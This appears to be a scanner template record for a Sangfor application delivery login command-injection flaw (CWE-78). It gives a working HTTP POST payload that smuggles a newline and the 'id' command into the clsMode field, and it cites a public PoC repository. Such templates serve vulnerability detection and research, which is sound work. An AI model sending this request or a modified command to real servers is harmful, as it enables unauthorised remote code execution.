# Nuclei Template: Sangfor Application Login - Remote Command Execution
**Template ID:** sangfor-login-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`sangfor-login-rce.yaml`)

## Vulnerability Information & PoC

## Description
Sangfor application delivery management system login has a remote command execution vulnerability, through which an attacker can obtain server privileges and execute arbitrary commands

## Steps to reproduce / Exploit Payload
```http
POST /rep/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```

## References
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/sangfor-login-rce.yaml
